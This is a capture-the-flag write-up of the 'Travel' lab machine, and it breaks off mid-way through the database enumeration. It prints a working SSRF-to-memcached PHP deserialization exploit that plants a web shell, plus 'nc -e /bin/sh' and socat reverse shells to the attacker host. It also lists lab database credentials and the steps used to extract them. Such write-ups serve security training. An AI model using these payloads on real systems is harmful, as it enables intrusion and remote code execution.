Travel was a fun box that involved injecting a php serialized object into memcache via ssrf and exploiting a wordpress plugin SimplePie to unserialize our arbitiary code. We then enumerate database files to find our credentials. Root involved abusing admin access to LDAP to access a user in the sudoers group that could then be used to get our root shell.

# Summary
- enumeration of blog-dev.travel.htb
- using `git-dumper` to get the `.git` dir
- enumerating the files and understanding what is happening
- using `custom_feed_url=` to get a connection on our listener
- bypassing ssrf
- discovering debug.php
- using memcache and triggering the php desirialization
- getting a shell as `www-data`
- enumeration of files leads to creds
- user.txt
- enum on ldap files
- adding jane to ldap
- login as jane
- running commands as sudo for root shell
- root.txt



> please note that this blog post was slightly rushed sorry about that ;) so please note that some elements might be missing that i havent noticed when going over it, sorry  if there is confusion in advance


# Enumeration

## Nmap

```bash
┌──(kali㉿kali)-[~/htb/boxes/travel]
└─$ nmap -sC -sV 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 09:33 EDT
Nmap scan report for 10.10.10.189
Host is up (0.083s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.82 seconds
```
See a few domains in the nmap scan so we add them to our hosts(blog.travel.htb and blog-dev.travel.htb )

We can access blog.travel.htb directly in our browser.
## Gobuster

```bash
┌──(kali㉿kali)-[~/htb/boxes/travel]
└─$ gobuster dir -u http://10.10.10.189 -w /home/kali/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.189
[+] Threads:        10
[+] Wordlist:       /home/kali/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/09 09:34:02 Starting gobuster
===============================================================
/img (Status: 301)
/css (Status: 301)
/lib (Status: 301)
/js (Status: 301)
/newsfeed (Status: 301)
```
We dont seem to find anything too interesting so far so we carry on to the subdomain blog.travel.htb
```bash
┌──(kali㉿kali)-[~/htb/boxes/travel]
└─$ gobuster dir -u http://blog.travel.htb/ -w /home/kali/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://blog.travel.htb/
[+] Threads:        10
[+] Wordlist:       /home/kali/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/09 09:40:38 Starting gobuster
===============================================================
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/atom (Status: 301)
/a (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/h (Status: 301)
/rss2 (Status: 301)
/wp-includes (Status: 301)
/A (Status: 301)
/H (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/' (Status: 301)
/aw (Status: 301)
/dashboard (Status: 302)
/he (Status: 301)
/%20 (Status: 301)
```
we see the file `/aw` this redirects us to `/awesome-rss/` which seems to be the template for the website `Blog-dev.travel.htb`

We move on to the next subdomain.
upon further enumeration of directories and after many scans we come accross a `.git` directory.

We see that only some of the files are readable by us but we want access to the entire directory.
To do this we will use a tool called `gitdumper` to dump the contents to our box.

[GitDumper tool](https://github.com/arthaud/git-dumper)

```bash
┌──(kali㉿kali)-[~/htb/boxes/travel/git-dumper]
└─$ ./git-dumper.py http://blog-dev.travel.htb/ ../blog-dev
[-] Testing http://blog-dev.travel.htb/.git/HEAD [200]
[-] Testing http://blog-dev.travel.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://blog-dev.travel.htb/.gitignore [404]
[-] Fetching http://blog-dev.travel.htb/.git/description [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/update.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/info/exclude [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/index [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/info/packs [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-receive.sample [200]
[-] Finding refs/
[-] Fetching http://blog-dev.travel.htb/.git/ORIG_HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/HEAD [200]
[-] Fetching http://blog-dev.travel.htb/.git/config [200]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/stash [404]
[-] Fetching http://blog-dev.travel.htb/.git/FETCH_HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/info/refs [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/HEAD [200]
[-] Fetching http://blog-dev.travel.htb/.git/refs/stash [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/wip/index/refs/heads/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/packed-refs [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/heads/master [200]
[-] Fetching http://blog-dev.travel.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://blog-dev.travel.htb/.git/objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://blog-dev.travel.htb/.git/objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f [200]
[-] Running git checkout .
```
We will now enumerate this directory. 
```
ls
README.md  rss_template.php  template.php
```
We have access to 3 files. the `readme` and the 2 templates for the website.

## rss_template.php

```bash
<?php
/*
Template Name: Awesome RSS
*/
include('template.php');
get_header();
?>

<main class="section-inner">
        <?php
        function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';     
     $simplepie = null;   
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
         }

        $url = $_SERVER['QUERY_STRING'];
        if(strpos($url, "custom_feed_url") !== false){
                $tmp = (explode("=", $url)); 
                $url = end($tmp); 
         } else {
                $url = "http://www.travel.htb/newsfeed/customfeed.xml";
         }
         $feed = get_feed($url); 
     if ($feed->error())
                {
                        echo '<div class="sp_errors">' . "\r\n";
                        echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
                        echo '</div>' . "\r\n";
                }
                else {
        ?>
        <div class="chunk focus">
                <h3 class="header">
                <?php 
                        $link = $feed->get_link();
                        $title = $feed->get_title();
                        if ($link) 
                        { 
                                $title = "<a href='$link' title='$title'>$title</a>"; 
                        }
                        echo $title;
                ?>
                </h3>
                <?php echo $feed->get_description(); ?>

        </div>
        <?php foreach($feed->get_items() as $item): ?>
                <div class="chunk">
                        <h4><?php if ($item->get_permalink()) echo '<a href="' . $item->get_permalink() . '">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class="footnote"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>
                        <?php echo $item->get_content(); ?>
                        <?php
                        if ($enclosure = $item->get_enclosure(0))
                        {
                                echo '<div align="center">';
                                echo '<p>' . $enclosure->embed(array(
                                        'audio' => './for_the_demo/place_audio.png',
                                        'video' => './for_the_demo/place_video.png',
                                        'mediaplayer' => './for_the_demo/mediaplayer.swf',
                                        'altclass' => 'download'
                                )) . '</p>';
                                if ($enclosure->get_link() && $enclosure->get_type())
                                {
                                        echo '<p class="footnote" align="center">(' . $enclosure->get_type();
                                        if ($enclosure->get_size())
                                        {
                                                echo '; ' . $enclosure->get_size() . ' MB';
                                        }
                                        echo ')</p>';
                                }
                                if ($enclosure->get_thumbnail())
                                {
                                        echo '<div><img src="' . $enclosure->get_thumbnail() . '" alt="" /></div>';
                                }
                                echo '</div>';
                        }
                        ?>

                </div>
        <?php endforeach; ?>
<?php } ?>
</main>

<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();


template.php
<?php

/**
 Todo: finish logging implementation via TemplateHelper
*/

function safe($url)
{
        // this should be secure
        $tmpUrl = urldecode($url);
        if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
        {
                die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
        }
        if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
        {
                die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
        }
        $tmp = parse_url($url, PHP_URL_HOST);
        // preventing all localhost access
        if($tmp == "localhost" or $tmp == "127.0.0.1")
        {
                die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");
        }
        return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        $output = shell_exec($pl);
    return $output;
}


class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    public function __wakeup()
    {
        $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

## Readme.md

```bash
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
* create logs directory in `wp-content/themes/twentytwenty` 
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks 
- added caching
- added rss template

## ToDo

- finish logging implementation
```

## Understanding the repo

We know that the `rss_template` file is the source for the `/awesome_rss` site on `blog.travel.htb`.

In `rss_template` we can see the following code:
```php
$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp);
This shows us that the parameter we will need is ?custom_feed_url
We also see this following block of code:
function url_get_contents ($url) {
    $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
    return $output;
}
```

The funtion is getting our url that we specify in `?custom_rss=` and making a `curl` request to this url.

# The SSRF


I will test this parameter to see if we can get a connection back on my nc listener. We run the following command:
```bash
curl "http://blog.travel.htb/awesome-rss/?custom_feed_url=10.10.14.14"
```
And we get a connection back on our listener.
```bash
sudo nc -nlvp 80                                    1 ⨯
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.189] 38274
GET / HTTP/1.1
Host: 10.10.14.14
User-Agent: curl/7.64.0
Accept: */*
```

We now head back to our files and enumerate them.

## ssrf protections

The one thing that sticks out immidieately is a funtion withing the source that attepts to protect against ssrf attacks. You can read more about theese at: 
[https://en.wikipedia.org/wiki/Server-side_request_forgery](https://en.wikipedia.org/wiki/Server-side_request_forgery)

This source seems to not allow certain things in our url. It doesnt allow the use of `file://` as the protocol. it doesnt allow the use of the term `localhost` or equivelant address `127.0.0.1` it also does not allow the flags `-F` and `-o`.
```php
if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");	
```	
We go ahead and test this on the website. We use this url:
```bash
http://blog.travel.htb/awesome-rss/?custom_feed_url=localhost:80
```

In theory this shouldnt work as we used localhost which is not allowed in the php file.

As expected we get the error:
```
Hacking attempt prevented (Internal SSRF). Event has been logged.
```
## Testing memcached cli and debug.php

So we know that the template.php is infact being used on this website.
We enumerate the `rss_templat`e file a bit further and come accross this line of code:
```
$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
```

This reveals that memcache is running on the box.

We go back to the `readme.md` file and see that it mentions a directory called `wp-content/themes/twentytwenty/`.

We enum further and we find a mention of a file called `debug.php` in the `rss_template`.
We assume that theese two finding must be linked somehow and we access `debug.php` in the browser.

We access it with this url.
```
http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
```

All it returns are loads of `~~~~~~~~`

After spending ages sitting at this part i finally managed to link all my findings together and exploit it.

We have to combine the links for the dubug.php page and inject it with our own custom parameters, being `custom_feed_url`, we provide this parameter with our own `customfeed.xml` which is that of the `/newsfeed/customfeed.xml` file. We can downlaod the file to our box and then link it to debug.php so it executes it. 

We setup a python http server with `python3 -m http.server` and navigate to the following url:
```
http://blog.travel.htb/awesome-rss/?debug&custom_feed_url=http://10.10.14.14/feed.xml
```
Our python server gets hitted and we head back to our browser.
```
 python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.189 - - [09/Sep/2020 10:24:54] "GET /customfeed.xml HTTP/1.1" 200 -
10.10.10.189 - - [09/Sep/2020 10:24:54] "GET /customfeed.xml HTTP/1.1" 200 -
10.10.10.189 - - [09/Sep/2020 10:24:58] "GET /customfeed.xml HTTP/1.1" 200 -
```
In a new tab we navigate to the url:
```
http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
```
And we get a new output:
```bash
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ | xct_760d1ad137(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) | ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```
## PHP serialization

The interesting part being:
```
| xct_760d1ad137(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
    ```
Now we need to understand what this does.
After also spending a long while at this stage in the box i put some effort in and tried to understand what was going on.
The code used in the template.php is the `TemplateHelper` class from SimplePie that is used for the php serialization:
```
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```
# Exploit
This is a process where the contents are converted into a bytestream  representation so that they can be stored in a file or a memory buffer, in our case the memcached. we can Inject with ssrf into memcache with our own TemplateHelper and after its been serialized writes our malicious data to a file.

After researching in depth for tools that we could use we come accross this tool:
[gopherus](https://github.com/tarunkant/Gopherus)

In particular we want the PHPmemcached.py script, it looks as follows
```python
import urllib

def PHPMemcached():
    print "\033[01m" + "\nThis is usable when you know Class and Variable name used by user\n"+ "\033[0m"

    code = raw_input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")

    if(not code):
        print "\033[93m" + "Plz give payload" + "\033[0m"
        exit()

    payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"

    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
    print "\033[04m" + "gopher://127.0.0.1:11211/_" + finalpayload + "\033[0m"
    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
```
This script is generating a payload with the gopher protocol to exploit ssrf and inject into memcahce, we know this from before this that the memcached exists on the system so we should have the right tool.
First of all we need to bypass the ssrf filters that we saw earlier to do this we have to change the following things:

- 127.0.0.1
- localhost

We can simply just use `LOCALHOST` or `127.00.0.1` in caps to bypass it's as simple as that.
We will now attempt to edit the script to fit our needs.
The exploit
We head back to the `template.ph`p file and take another look at it in more detail.
```php
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
```

We see that this section of code is telling us that the data stored is going into `/logs/` directory. So that our arbitary code will be going into here.

From the rest of the code its obvious that it us using something called SimplePie, SimplePie is used for parsing the url feed url and caching it using memcache, it stores the serialized PHP object in cache until we need it and then unserializes it when using it. 

So we realise that we can use some sort of deserialization attack to get the remote code execution on the site.

We can see from reading the [docs](https://simplepie.org/api/source-class-SimplePie.html)

we can see that it is simply just converting the url that is used into an md5 hash. like so:
```
md5(md5($url):"spc")
```
So at our debug.php page output:
```
| xct_760d1ad137(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
    ```
We see that after the xct_ there is a partial md5 string, the rest of the values were also partial. This means that the hash 760d1ad137 is part of the full md5 hash of the url that was visited.

Now we will head back to our exploit and change a few things:

- `127.0.0.1` will be changed to `127.00.0.1`
- We will put our proper key in there rather than SpyD3r

So our proper key will be as follows:
```
md5(md5($url):"spc")
```
Then the full md5 hash will follow this system:
```
md5(md5("http://www.travel.htb/newsfeed/customfeed.xml"):"spc")
```
This will result in our final md5 hash of 4e5612ba079c530a6b1f148c0b352241
So our final key will be:
```
xct_4e5612ba079c530a6b1f148c0b352241
```

Now we need to edit the script to make it our own. Using the phpmecached exploit as a template
We edit the code variable and replace it with this:
```
	code = 'O:14:"TemplateHelper":2:{s:4:"file";s:'+str(len(file))+':"'+file+'";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}'
```
also tweaking the payload like so:
```
"%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
```
We then add this code block at the end which does our ssrf attack for us:
```py
payload = pl()

print "Stage 1: SSRF in memcached"

ssrfURL = url+"awesome-rss/?debug=yes&custom_feed_url="+payload

x = requests.get(ssrfURL)
print(x.status_code)

print "Stage 2: Trigger Deserilzation"
x = requests.get(url+"awesome-rss/")
print(x.status_code)

payloadURL = url + "wp-content/themes/twentytwenty/logs/"+file
while True:
    print payloadURL
    x = requests.get(payloadURL)
    print(x.status_code)
    if x.status_code == 200:
        break;

print "Stage 3: Get a Shell"

rceURL = payloadURL+"?cmd=nc -e /bin/sh "+HOST+" "+PORT
print rceURL
x = requests.get(rceURL)
```
so our final exploit is:
```py
import urllib
import requests

host="10.10.14.14"
port=1234
file="shell.php"
url="http://blog.travel.htb"
 
def pl():

	code = 'O:14:"TemplateHelper":2:{s:4:"file";s:'+str(len(file))+':"'+file+'";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}'
 
	payload = "%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
 
    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    return "gopher://2130706433:11211/_" + finalpayload



payload = pl()

print "Stage 1: SSRF in memcached"

ssrfURL = url+"awesome-rss/?debug=yes&custom_feed_url="+payload

x = requests.get(ssrfURL)
print(x.status_code)

print "Stage 2: Trigger Deserilzation"
x = requests.get(url+"awesome-rss/")
print(x.status_code)

payloadURL = url + "wp-content/themes/twentytwenty/logs/"+file
while True:
    print payloadURL
    x = requests.get(payloadURL)
    print(x.status_code)
    if x.status_code == 200:
        break;

print "Stage 3: Get a Shell"

rceURL = payloadURL+"?cmd=nc -e /bin/sh "+HOST+" "+PORT
print rceURL
x = requests.get(rceURL)
```

Then we of course run the exploit:
```bash
python exploit.py                                                                                                
Stage 1: SSRF in memcached
200
Stage 2: Trigger Deserilzation
200
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php
200
Stage 3: Get a Shell
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=nc -e /bin/sh 10.10.14.14 1234
```
## Shell as www-data
After we run this we get a connection back on our host machine!
```
┌──(kali㉿kali)-[~/htb/boxes/travel]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.189] 45856
whoami
www-data
```
Unfortunately `python` is not installed on the box so we cant upgrade our shell into a fully interactive one.

Luckily `socat` is so we will get a reverse shell using socat. We run this command on our shell:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.14:3333
```
And then on our host we get a connection back:
```
┌──(kali㉿kali)-[~/htb/boxes/travel/blog-dev]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:3333
www-data@blog:/$
```
Cool so now we have an upgraded shell so we can begin our enumeration of the host.
We assume this is a docker container but we confirm our suspicions by running `ip a`:
```bash
www-data@blog:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:1e:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.30.0.10/24 brd 172.30.0.255 scope global eth0
       valid_lft forever preferred_lft forever
```
The inet address should be 10.10.10.189 so we know its a docker as it doesnt have that ip address.

After some very basic enumeration we find a file in `/var/www/html/wp-config.php` which contains mysql database credentials.
## Mysql database extraction
```bash
www-data@blog:/var/www/html$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp' );

/** MySQL database username */
define( 'DB_USER', 'wp' );

/** MySQL database password */
define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );

/** MySQL hostname */
define( 'DB_HOST', '127.0.0.1' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'W<0D4W5<?QQPd>x1HfyprdtXl`R10M=4].x$O.nt_hAU`!`F}NFpi1&AavW>W5rQ' );
define( 'SECURE_AUTH_KEY',  '`B$8*$(_rO.Wf|Z@JX#U3t!qZHLg%bF&N02Bxb_4R:TLOz9qj~{0Dr$otoR1;bJo' );
define( 'LOGGED_IN_KEY',    'GQy$o3Zh~XUGc2;,&@c8&4ir)CBA)&q09R!T~y+>Mo9V0hLt-WEKJ<07f8zY3d}U' );
define( 'NONCE_KEY',        'p4!$VwTVVGT-F}]_0D[0dQgEnt/CH?uoQL*RD6xXE;p;@br1?ag.(Y$mmrJHR0D2' );
define( 'AUTH_SALT',        '/v^;MjaSq%b;?D:@Q12TCOV]j;{wnN@I6!7CG]jNlf.2qBC$<` wG|,zsll9RaoL' );
define( 'SECURE_AUTH_SALT', 'wvOC4$,y>0!g|%m1Z{qdw5@bArM}XRk=snP7^Eot{t98[j|JS<%q;%rv%IQ*`8n|' );
define( 'LOGGED_IN_SALT',   '=LVvb]NawR#b+U<Z|Iq#*h/+G22bAxrZ|{n)BLk7~w:Ol-od,HG?Xku}5Y36%x@b' );
define( 'NONCE_SALT',       'ZV@LQsgfC`|,&LOhX%i%MuvVJ{!E,PO[z3E3$CGpdfw:^t1AE@l`:7j?TN0n{,,7' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

This section in particular:
define( 'DB_NAME', 'wp' );

/** MySQL database username */
define( 'DB_USER', 'wp' );

/** MySQL database password */
define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );
```
From here we can attempt to login to the mysql running on localhost using the password `fiFtDDV9LYe8Ti`
```bash
www-data@blog:/var/www/html$ mysql -h 127.0.0.1 -u wp -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14082
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
We then pull the databases and extract the tables from database wp and the table wp_users, we successfully find a password hash.
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wp                 |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]> use wp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wp]> show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

We then pull the password with:
MariaDB [wp]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)
```
After attempting to try and crack it it didnt crack. Turns out it cant and this part was not needed but i thought i would share it anyway.
After some more enumeration we come accross an sql  file, we cat this and find credentials inside
```sql
LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
